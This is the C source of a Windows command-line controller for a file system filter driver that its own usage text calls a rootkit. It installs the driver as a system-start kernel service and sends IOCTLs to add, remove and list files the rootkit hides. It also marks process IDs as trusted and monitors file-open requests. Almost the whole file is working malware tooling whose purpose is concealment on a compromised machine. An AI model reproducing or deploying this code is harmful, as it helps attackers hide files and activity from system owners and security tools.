#include <windows.h>
#include <stdio.h>
#include <assert.h>
#include <fsfltr_data.h>

#define PAGE_SIZE 4096

typedef LONG NTSTATUS;

typedef enum _EXCEPTION_FUNCTION_ID 
{
	convertbufofptronstrtomultiszstr = 1
} EXCEPTION_FUNCTION_ID;

typedef enum _DRIVER_OP_CODES 
{
	InternalCleanup,
	FsFltrAddFiles,
	FsFltrDelFiles,
	FsFltrQueryFiles
} DRIVER_OP_CODES;

typedef 
DWORD
(__stdcall *PRTL_NTSTATUS_TO_DOS_ERROR_NO_TEB)(
	IN NTSTATUS StatusCode
	);

struct _DEFERRED_IMPORT
{
	PRTL_NTSTATUS_TO_DOS_ERROR_NO_TEB pRtlNtStatusToDosErrorNoTeb;
} DeferredImport;

HANDLE hQuitEvent = NULL;
HANDLE hQuitReplyEvent = NULL;

VOID 
Usage(  
	);

//output error with message box
VOID PrintError( 
	IN LPWSTR pwszFuncName 
	);

//exception dispatcher
LONG 
ExcptFilter(
	IN PEXCEPTION_POINTERS ExcptInfo,
	IN EXCEPTION_FUNCTION_ID FuncId,
	OUT PDWORD dwWin32Status
	);

//initialize deffered import
VOID 
InitializeDeferredImport(  
	);

//convert buffer with pointers of strings to flat multi string zero
BOOL
ConvertBufOfPtrOnStrsToMultiSzStr(
	 OUT WCHAR **pwszTarget,
	 IN WCHAR **ppwszSource,
	 IN DWORD cpwszSource,
	 OUT PDWORD pcbTarget
	 );

BOOL
DriverOpCodesDispatcher(
	IN DRIVER_OP_CODES OpCode,
	IN PVOID pDataBuf,
	IN DWORD cbDataBuf
	);

VOID
OutDataToConsole( 
	 IN PPENDING_FILE_INFORMATION PendingFileInfo
	 );

VOID 
ListenCreateRequest( 
	);

BOOL 
__stdcall CmdCtrlHandler( 
	IN DWORD fdwCtrlType 
	); 

BOOL InstallService( 
	IN LPCWSTR wszServicePath, 
	IN LPCWSTR wszServiceName,
	IN LPCWSTR wszServiceDisplayName, 
	IN DWORD dwServiceType,
	IN DWORD dwStartType, 
	IN DWORD dwErrorControl, 
	IN LPCWSTR wszLoadOrderGroup, 
	IN LPCWSTR wszDependOnService,
	IN LPWSTR wszDescription 
	);

BOOL 
RemoveService( 
	IN LPCWSTR wszServiceName 
	);


VOID 
wmain( 
	INT argc, 
	WCHAR **argv 
	)
{
	PWCHAR pwszHideFileNames = NULL;
	DWORD buf_size = 0;

	InitializeDeferredImport(  );

	SetConsoleCtrlHandler( CmdCtrlHandler, TRUE );

	if( argc > 1 && 
		( argv[1][0] == L'-' || argv[1][0] == L'/' ) )
	{
		if( lstrcmpi( &argv[1][1], L"add" ) == 0 )
		{
			if( argc < 3 ) 
			{
				printf( "not enough actual parameters\n" );
				return;
			}

			if( ConvertBufOfPtrOnStrsToMultiSzStr( &pwszHideFileNames, &argv[2], argc - 2, &buf_size ) == 0 )
			{
				PrintError( L"ConvertBufOfPtrOnStrsToMultiSzStr" );
				return;
			}
			
			if( DriverOpCodesDispatcher( FsFltrAddFiles, pwszHideFileNames, buf_size ) == FALSE )
			{
				switch( GetLastError(  ) )
				{
					case ERROR_BAD_LENGTH: // STATUS_INFO_LENGTH_MISMATCH
					{
						assert( 0 );
					}
					case ERROR_NO_SYSTEM_RESOURCES: //STATUS_INSUFFICIENT_RESOURCES
					{
						PrintError( L"wmain" );
						HeapFree( GetProcessHeap(  ), 0, pwszHideFileNames );
						return;
					}
					default:
					{
						assert( 0 );
					}
				}
			}

			DriverOpCodesDispatcher( InternalCleanup, NULL, 0 );

			HeapFree( GetProcessHeap(  ), 0, pwszHideFileNames );

			return;
		}
		else if( lstrcmpi( &argv[1][1], L"del" ) == 0 )
		{
			if( argc < 3 ) 
			{
				printf( "not enough actual parameters\n" );
				return;
			}

			if( ConvertBufOfPtrOnStrsToMultiSzStr( &pwszHideFileNames, &argv[2], argc - 2, &buf_size ) == 0 )
			{
				PrintError( L"ConvertBufOfPtrOnStrsToMultiSzStr" );
				return;
			}
			
			if( DriverOpCodesDispatcher( FsFltrDelFiles, pwszHideFileNames, buf_size ) == FALSE )
			{
				switch( GetLastError(  ) )
				{
					case ERROR_BAD_LENGTH: // STATUS_INFO_LENGTH_MISMATCH
					{
						assert( 0 );
					}
					case ERROR_NO_SYSTEM_RESOURCES: //STATUS_INSUFFICIENT_RESOURCES
					{
						PrintError( L"wmain" );
						HeapFree( GetProcessHeap(  ), 0, pwszHideFileNames );
						return;
					}
					default:
					{
						assert( 0 );
					}
				}
			}

			DriverOpCodesDispatcher( InternalCleanup, NULL, 0 );

			HeapFree( GetProcessHeap(  ), 0, pwszHideFileNames );

			return;
		}
		else if( lstrcmpi( &argv[1][1], L"query" ) == 0 )
		{
			ULONG cbBuf = PAGE_SIZE * 2;
			
			pwszHideFileNames = (PWCHAR) VirtualAlloc( NULL, cbBuf, 
				MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );

			if( DriverOpCodesDispatcher( FsFltrQueryFiles, pwszHideFileNames, cbBuf ) == FALSE )
			{
				switch( GetLastError(  ) )
				{
					case ERROR_BAD_LENGTH: // STATUS_INFO_LENGTH_MISMATCH
					{
						VirtualFree( pwszHideFileNames, PAGE_SIZE * 2, MEM_RELEASE );

						pwszHideFileNames = (PWCHAR) VirtualAlloc( NULL, cbBuf * 2, 
							MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );

						if( DriverOpCodesDispatcher( FsFltrQueryFiles, pwszHideFileNames, cbBuf ) == FALSE )
						{
							PrintError( L"wmain" );
							VirtualFree( pwszHideFileNames, PAGE_SIZE * 2, MEM_RELEASE );
							return;
						}
					}
					case ERROR_NO_SYSTEM_RESOURCES: //STATUS_INSUFFICIENT_RESOURCES
					{
						PrintError( L"wmain" );
						HeapFree( GetProcessHeap(  ), 0, pwszHideFileNames );
						return;
					}
					case ERROR_NO_MORE_FILES:
					{
						printf( "no files in list\n" );
						return;
					}
					default:
					{
						assert( 0 );
					}
				}
			}

			ULONG next_offset = 0;
			ULONG i = 1;

			for( PWCHAR QueryStr = pwszHideFileNames; 
				 QueryStr[0];
				 QueryStr = ( PWCHAR )( (PUCHAR)QueryStr + next_offset ),
				 i++ )
			{
				next_offset = ( lstrlen( QueryStr ) + 1 ) * sizeof( WCHAR );
				printf( "File #%i: %S\n", i, QueryStr );
			}

			DriverOpCodesDispatcher( InternalCleanup, NULL, 0 );

			VirtualFree( pwszHideFileNames, PAGE_SIZE * 2, MEM_RELEASE );

			return;
		}
		else if( lstrcmpi( &argv[1][1], L"listen" ) == 0 )
		{
			ListenCreateRequest(  );
			return;
		}
		else if( lstrcmpi( &argv[1][1], L"install" ) == 0 )
		{
			WCHAR szDriverPath[512];
			BOOL f;

			GetWindowsDirectory( szDriverPath, 512 );
			lstrcatW( szDriverPath, L"\\system32\\drivers\\fsfltr.sys" );

			f = InstallService( szDriverPath, L"fsfltr", L"File System Filter Driver", 
				SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START, SERVICE_ERROR_NORMAL,
					NULL, NULL, L"File System Filter Driver" );

			if( !f ) PrintError( L"InstallService" );
			return;
		}
		else if( lstrcmpi( &argv[1][1], L"remove" ) == 0 )
		{
			if( RemoveService( L"fsfltr" ) == 0 )
			{
				PrintError( L"RemoveService" );
			}
			return;
		}
		else if( lstrcmpi( &argv[1][1], L"add_proc" ) == 0 )
		{
			struct {
				ULONG numPids;
				ULONG Pid;
			} TrustedProc;
			ULONG cb_ret;

			if( argc != 3 )
			{
				Usage(  );
				return;
			}
			ULONG Pid = _wtoi( &argv[2][0] );

			HANDLE hFsFltrDev = CreateFile( L"\\\\.\\FsFltr", FILE_READ_DATA | FILE_WRITE_DATA,
				0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

			if( hFsFltrDev == INVALID_HANDLE_VALUE )
			{
				return;
			}

			TrustedProc.numPids = 1;
			TrustedProc.Pid = Pid;

			if( DeviceIoControl( hFsFltrDev, IOCTL_ADD_TRUSTED_PROCESSES, &TrustedProc, 
					sizeof( TrustedProc ), NULL, 0, &cb_ret, NULL ) == FALSE )
			{
				CloseHandle( hFsFltrDev );

				if( GetLastError(  ) == ERROR_FILE_NOT_FOUND ) //STATUS_NO_SUCH_FILE
				{
					printf( "This process already present in list of trusted\n" );
					return;
				}

				PrintError( L"wmain" );
				return;
			}

			printf( "Successfully add process %d\n", Pid );
			CloseHandle( hFsFltrDev );
			return;
		}
		else if( lstrcmpi( &argv[1][1], L"remove_proc" ) == 0 )
		{
			struct {
				ULONG numPids;
				ULONG Pid;
			} TrustedProc;
			ULONG cb_ret;

			if( argc != 3 )
			{
				Usage(  );
				return;
			}
			ULONG Pid = _wtoi( &argv[2][0] );

			HANDLE hFsFltrDev = CreateFile( L"\\\\.\\FsFltr", FILE_READ_DATA | FILE_WRITE_DATA,
				0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

			if( hFsFltrDev == INVALID_HANDLE_VALUE )
			{
				return;
			}

			TrustedProc.numPids = 1;
			TrustedProc.Pid = Pid;

			if( DeviceIoControl( hFsFltrDev, IOCTL_REMOVE_TRUSTED_PROCESSES, &TrustedProc, 
					sizeof( TrustedProc ), NULL, 0, &cb_ret, NULL ) == FALSE )
			{
				CloseHandle( hFsFltrDev );

				if( GetLastError(  ) == ERROR_FILE_NOT_FOUND ) //STATUS_NO_SUCH_FILE
				{
					printf( "Not found this process in list of trusted\n" );
					return;
				}

				PrintError( L"wmain" );
				return;
			}

			printf( "Successfully remove process %d\n", Pid );
			CloseHandle( hFsFltrDev );
			return;
		}
		else if( lstrcmpi( &argv[1][1], L"query_proc" ) == 0 )
		{
			PULONG pQueryPids = ( PULONG )
				VirtualAlloc( NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );

			if( pQueryPids == NULL )
			{
				PrintError( L"wmain" );
				return;
			}

			HANDLE hFsFltrDev = CreateFile( L"\\\\.\\FsFltr", FILE_READ_DATA | FILE_WRITE_DATA,
				0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
			ULONG cb_ret;

			if( hFsFltrDev == INVALID_HANDLE_VALUE )
			{
				return;
			}

			if( DeviceIoControl( hFsFltrDev, IOCTL_QUERY_TRUSTED_PROCESSES, NULL, 0, pQueryPids,
					4096, &cb_ret, NULL ) == FALSE )
			{
				CloseHandle( hFsFltrDev );

				if( GetLastError(  ) == ERROR_NO_MORE_FILES ) //STATUS_NO_SUCH_FILE
				{
					printf( "No processes in list of trusted\n" );
					return;
				}

				PrintError( L"wmain" );
				return;
			}
			
			ULONG numPids = *pQueryPids++;

			for( ULONG PidIndex = 0; PidIndex < numPids; PidIndex++ )
			{
				printf( "Process #%d: %d\n", PidIndex + 1, pQueryPids[PidIndex] );
			}

			VirtualFree( pQueryPids, 4096, MEM_RELEASE );
			CloseHandle( hFsFltrDev );

			return;
		}
	} 

	Usage(  );

	return;
}

VOID InitializeDeferredImport(  )
{
	HMODULE hNtDll = LoadLibrary( L"ntdll.dll" );
	assert( hNtDll );

	DeferredImport.pRtlNtStatusToDosErrorNoTeb = 
		(PRTL_NTSTATUS_TO_DOS_ERROR_NO_TEB)GetProcAddress( hNtDll, "RtlNtStatusToDosErrorNoTeb" );
	
	assert( DeferredImport.pRtlNtStatusToDosErrorNoTeb );
}

void 
Usage(  
	)
{
	printf( "\nfsfltrprg is a tool for control file system filter driver rootkit.\n\n" );
	printf( "Usage: fsfltrprg -option\n\n" );
	printf( "fsfltrprg -add file1 file2 file3 ... - add specified files in rootkit for hide\n" );
	printf( "fsfltrprg -del file1 file2 file3 ... - remove specified files from rootkit database\n" );
	printf( "fsfltrprg -query - output all files that rootkit hide now\n" );
	printf( "fsfltrprg -listen - listen open request of file system\n" );
	printf( "fsfltrprg -add_proc pid - set this process as trusted\n" );
	printf( "fsfltrprg -remove_proc pid - unset this process as trusted\n" );
	printf( "fsfltrprg -query_proc pid - output all trusted processes\n" );
	printf( "fsfltrprg -install - install filter driver in your system\n" );
	printf( "fsfltrprg -remove - remove filter driver from your system\n" );
}

BOOL
ConvertBufOfPtrOnStrsToMultiSzStr(
	 WCHAR **pwszTarget,
	 WCHAR **ppwszSource,
	 DWORD cpwszSource,
	 PDWORD pcbTarget
	 )
{
	DWORD cbTarget = 0;
	PWCHAR pwszTargetBuffer = NULL;
	PWCHAR pwszQueryString = NULL;
	DWORD dwWin32Error = ERROR_SUCCESS;
	DWORD dwExcptRaised = 0;

	assert( pwszTarget );
	assert( ppwszSource );
	assert( cpwszSource );

	*pwszTarget = NULL;
	*pcbTarget = 0;

	for( DWORD register i = 0; i < cpwszSource; i++ )
	{//calculate total amount of memory
		cbTarget += ( lstrlen( ppwszSource[i] ) * sizeof( WCHAR ) );
		cbTarget += sizeof( WCHAR ); //for \0 - byte
	}

	cbTarget += sizeof( WCHAR ); //for final \0 byte
	*pcbTarget = cbTarget;

	if( cbTarget > PAGE_SIZE * 2 )
	{
		SetLastError( ERROR_INVALID_PARAMETER );
		return FALSE;
	}

	__try
	{
		pwszQueryString = pwszTargetBuffer = ( PWCHAR )HeapAlloc( GetProcessHeap( ), 
			HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, cbTarget );
	}
	__except( ExcptFilter( GetExceptionInformation(  ), convertbufofptronstrtomultiszstr,
		&dwWin32Error ) )
	{
		dwExcptRaised = 1;
	}

	if( dwExcptRaised )
	{
		SetLastError( dwWin32Error );
		return FALSE;
	}

	for( DWORD register i = 0; i < cpwszSource; i++  )
	{
		ULONG cbQueryStr;

		cbQueryStr = ( lstrlen( ppwszSource[i] ) + 1 ) * sizeof( WCHAR );
		RtlCopyMemory( pwszQueryString, ppwszSource[i], cbQueryStr );
		pwszQueryString = ( PWCHAR )( ( LPBYTE )pwszQueryString + cbQueryStr );
	}

	*pwszTarget = pwszTargetBuffer;

	return TRUE;
}

LONG 
ExcptFilter(
	PEXCEPTION_POINTERS ExcptInfo,
	EXCEPTION_FUNCTION_ID FuncId,
	PDWORD dwWin32Status
	)
{
	if( FuncId == convertbufofptronstrtomultiszstr )
	{
		switch( ExcptInfo->ExceptionRecord->ExceptionCode )
		{
			case STATUS_NO_MEMORY:
			case STATUS_ACCESS_VIOLATION:
			{
				*dwWin32Status = 
					DeferredImport.pRtlNtStatusToDosErrorNoTeb( ExcptInfo->ExceptionRecord->ExceptionCode );

				return EXCEPTION_EXECUTE_HANDLER;
			}
			default:
			{
				return EXCEPTION_CONTINUE_SEARCH;
			}
		}
	}

	return EXCEPTION_CONTINUE_SEARCH;
}

VOID PrintError( LPWSTR pwszFuncName )
{
	WCHAR wszBuf[80];
	LPVOID lpMsgBuf;
	DWORD dwError = GetLastError(  );

	FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        dwError,
        0,
        (LPWSTR) &lpMsgBuf,
        0, NULL );

    wsprintf(wszBuf, 
        L"%s failed with error %d: %s", 
        pwszFuncName, dwError, lpMsgBuf); 
 
    MessageBox(NULL, wszBuf, L"Error", MB_OK); 
	
	LocalFree( lpMsgBuf );
}

BOOL
DriverOpCodesDispatcher(
	IN DRIVER_OP_CODES OpCode,
	IN PVOID pDataBuf,
	IN DWORD cbDataBuf
	)
{
	static HANDLE hFsFltrDev = NULL;
	BOOL status = TRUE;
	DWORD cbCopy;

	if( !hFsFltrDev )
	{//initialization
		hFsFltrDev = CreateFile( L"\\\\.\\FsFltr", FILE_READ_DATA | FILE_WRITE_DATA,
			0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

		if( hFsFltrDev == INVALID_HANDLE_VALUE )
		{
			return FALSE;
		}
	}

	switch( OpCode )
	{
		case InternalCleanup:
		{
			CloseHandle( hFsFltrDev );
			hFsFltrDev = 0;
			return TRUE;
		}
		case FsFltrAddFiles:
		{
			status = DeviceIoControl( hFsFltrDev, IOCTL_FSFLTR_ADD_FILES, NULL, 0, pDataBuf, 
				cbDataBuf, &cbCopy, NULL );

			return status;
		}
		case FsFltrDelFiles:
		{
			status = DeviceIoControl( hFsFltrDev, IOCTL_FSFLTR_REMOVE_FILES, NULL, 0, pDataBuf, 
				cbDataBuf, &cbCopy, NULL );

			return status;
		}
		case FsFltrQueryFiles:
		{
			status = DeviceIoControl( hFsFltrDev, IOCTL_FSFLTR_QUERY_FILES, NULL, 0, pDataBuf, 
				cbDataBuf, &cbCopy, NULL );

			return status;
		}
	}
	
	assert( 0 );

	return FALSE;
}

VOID ListenCreateRequest(  )
{
	DWORD cbBuf = PAGE_SIZE;
	PPENDING_FILE_INFORMATION PendingFileInfo = 
		(PPENDING_FILE_INFORMATION)VirtualAlloc( NULL, cbBuf, 
			MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
	BOOL status;
	HANDLE hFsFltrDev = NULL;
	DWORD cb_ret = 0;

	assert( PendingFileInfo );

	hQuitReplyEvent = CreateEvent( NULL, FALSE, FALSE, NULL );
	hQuitEvent = CreateEvent( NULL, FALSE, FALSE, NULL );

	hFsFltrDev = CreateFile( L"\\\\.\\FsFltr", FILE_READ_DATA | FILE_WRITE_DATA,
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

	if( hFsFltrDev == INVALID_HANDLE_VALUE )
	{
		return;
	}

	DeviceIoControl( hFsFltrDev, IOCTL_START_AVX, NULL, 0, NULL, 0, &cb_ret, NULL );

	while( 1 )
	{
		FILE_PENDING_FINAL_STATUS PendingFinalStatus = Enabled;

		RtlZeroMemory( PendingFileInfo, cbBuf );

		if( WaitForSingleObject( hQuitEvent, 0 ) == WAIT_OBJECT_0 )
		{
			DeviceIoControl( hFsFltrDev, IOCTL_STOP_AVX, NULL, 0, NULL, 0, &cb_ret, NULL );
			CloseHandle( hFsFltrDev );

			OVERLAPPED ov = { 0 };

			ov.hEvent = CreateEvent( NULL, FALSE, FALSE, NULL );

			hFsFltrDev = CreateFile( L"\\\\.\\FsFltr", FILE_READ_DATA | FILE_WRITE_DATA,
				0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL );

			while( 1 )
			{
				FILE_PENDING_FINAL_STATUS PendingFinalStatus = Enabled;
				DWORD WaitStatus;
				RtlZeroMemory( PendingFileInfo, cbBuf );

				DeviceIoControl( hFsFltrDev, IOCTL_LISTEN_CREATE_REQUEST, NULL, 0, 
					PendingFileInfo, cbBuf, &cb_ret, &ov );

				WaitStatus = WaitForSingleObject( ov.hEvent, 2000 );

				if( WaitStatus == WAIT_TIMEOUT )
				{
					status = CancelIo( hFsFltrDev );
					assert( status );
					CloseHandle( hFsFltrDev );

					SetEvent( hQuitReplyEvent );
					return;
				}

				OutDataToConsole( PendingFileInfo );

				PendingFinalStatus = Enabled;

				DeviceIoControl( hFsFltrDev, IOCTL_LISTEN_CREATE_REPLY, &PendingFinalStatus, 
					sizeof( FILE_PENDING_FINAL_STATUS ), NULL, 0, &cb_ret, &ov );
				
				WaitForSingleObject( ov.hEvent, INFINITE );
		
			}
		}

		status = DeviceIoControl( hFsFltrDev, IOCTL_LISTEN_CREATE_REQUEST, NULL, 0, 
			PendingFileInfo, cbBuf, &cb_ret, NULL );

		assert( status );

		OutDataToConsole( PendingFileInfo );
		
		//send that request enable
		status = DeviceIoControl( hFsFltrDev, IOCTL_LISTEN_CREATE_REPLY, &PendingFinalStatus, 
			sizeof( FILE_PENDING_FINAL_STATUS ), NULL, 0, &cb_ret, NULL );

		assert( status );
	}
}

VOID
OutDataToConsole( 
	 PPENDING_FILE_INFORMATION PendingFileInfo
	 )
{
		printf( "Try create file: %S\n", &PendingFileInfo->FileName );
		printf( "Disposition: " );
		
		switch( PendingFileInfo->CreateDisposition )
		{
			case PENDING_FILE_INFORMATION::FileSupersede:
			{
				printf( "FileSupersede" );
				break;
			}
			case PENDING_FILE_INFORMATION::FileCreate:
			{
				printf( "FileCreate" );
				break;
			}
			case PENDING_FILE_INFORMATION::FileOpen:
			{
				printf( "FileOpen" );
				break;
			}
			case PENDING_FILE_INFORMATION::FileOpenIf:
			{
				printf( "FileOpenIf" );
				break;
			}
			case PENDING_FILE_INFORMATION::FileOverwrite:
			{
				printf( "FileOverwrite" );
				break;
			}
			case PENDING_FILE_INFORMATION::FileOverwriteIf:
			{
				printf( "FileOverwriteIf" );
				break;
			}
			default:
			{
				assert( 0 );
			}
		}

		printf( "\n" );

		printf( "Client ID: %X.%X\n", 
			PendingFileInfo->Cid.UniqueProcess, PendingFileInfo->Cid.UniqueThread );
		
		printf( "Requestor ID: " );

		switch( PendingFileInfo->Internal.RequestorId )
		{
			case PENDING_FILE_INFORMATION::INTERNAL::FastIoQueryOpen:
			{
				printf( "FastIoQueryOpen" );
				break;
			}
			case PENDING_FILE_INFORMATION::INTERNAL::IrpMjCreate:
			{
				printf( "IrpMjCreate" );
				break;
			}
			default:
			{
				assert( 0 );
			}
		}

		printf( "\n\n" );
}


BOOL 
__stdcall CmdCtrlHandler( 
	DWORD fdwCtrlType 
	) 
{
	HANDLE hFsFltrDev = NULL;

	switch( fdwCtrlType ) 
	{ 
		case CTRL_CLOSE_EVENT: 
    	case CTRL_BREAK_EVENT:
		case CTRL_C_EVENT: 
		{
			if( hQuitEvent )
			{
				SetEvent( hQuitEvent );
				assert( hQuitReplyEvent );
				WaitForSingleObject( hQuitReplyEvent, INFINITE );
			}
			return TRUE;
		}
 
		case CTRL_LOGOFF_EVENT: 
		case CTRL_SHUTDOWN_EVENT:
		default:
		{
			return FALSE;
		}
   }

	assert( 0 );
}

BOOL InstallService( 
	IN LPCWSTR wszServicePath, 
	IN LPCWSTR wszServiceName,
	IN LPCWSTR wszServiceDisplayName, 
	IN DWORD dwServiceType,
	IN DWORD dwStartType, 
	IN DWORD dwErrorControl, 
	IN LPCWSTR wszLoadOrderGroup, 
	IN LPCWSTR wszDependOnService,
	IN LPWSTR wszDescription 
	)
{
	SC_HANDLE hSM = NULL;
	SC_HANDLE hSrv = NULL;
	DWORD status = 1;
	HKEY hKey;
	WCHAR wszKeyName[260];
	DWORD cbDescription;
	
	hSM = OpenSCManager( NULL, //local machine
		NULL, //database def
		SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE );

	if( hSM == NULL )
		return 0;
	
	hSrv = CreateService( hSM,
		wszServiceName,
		wszServiceDisplayName,
		SERVICE_ALL_ACCESS,
		dwServiceType,
		dwStartType,
		dwErrorControl,
		wszServicePath,
		wszLoadOrderGroup, //group
		NULL, //tag
		wszDependOnService, //dependencies
		NULL, //account
		NULL //password
	);

	if( hSrv == NULL )
	{
		if( GetLastError(  ) == ERROR_SERVICE_EXISTS )
		{
			hSrv = OpenService( hSM, wszServiceName, SERVICE_CHANGE_CONFIG );

			status = ChangeServiceConfig( hSrv, dwServiceType, dwStartType, 
				dwErrorControl, wszServicePath, wszLoadOrderGroup, NULL, wszDependOnService, NULL, NULL, 
				wszServiceDisplayName );
		}
		else
		{
			status = 0;
		}
	}

	if( status && wszDescription )
	{
		lstrcpy( wszKeyName, L"System\\CurrentControlSet\\Services\\" );
		lstrcat( wszKeyName, wszServiceName );
		
		RegOpenKeyEx( HKEY_LOCAL_MACHINE, 
			wszKeyName, 
			0, //reserved 
			KEY_SET_VALUE,
			&hKey );

		cbDescription = lstrlen( wszDescription ) * sizeof( WCHAR ) + sizeof( WCHAR );

		if( RegSetValueEx( hKey, L"Description",
			0, //reserved
			REG_SZ,
			( BYTE* )wszDescription,
			cbDescription ) != ERROR_SUCCESS )
		{
			status = 0;
		}

		RegCloseKey( hKey );

	}

	if( hSM ) CloseServiceHandle( hSM );
	if( hSrv ) CloseServiceHandle( hSrv );

	return status;
}

BOOL 
RemoveService( 
	IN LPCWSTR wszServiceName 
	)
{
	WCHAR wszKeyName[260];
	LONG status;
	HKEY hKey;
	LONG DeleteFlag = 1;

	lstrcpy( wszKeyName, L"System\\CurrentControlSet\\Services\\" );
	lstrcat( wszKeyName, wszServiceName );
		
	status = RegOpenKeyEx( HKEY_LOCAL_MACHINE, 
		wszKeyName, 
		0, //reserved 
		KEY_SET_VALUE,
		&hKey );

	SetLastError( status );

	if( status != ERROR_SUCCESS )
	{
		return 0;
	}

	status = RegSetValueEx( hKey, L"DeleteFlag", 0,
		REG_DWORD, (BYTE*)&DeleteFlag, sizeof( LONG ) );

	SetLastError( status );

	RegCloseKey( hKey );

	if( status != ERROR_SUCCESS )
		return 0;
	else
		return 1;
}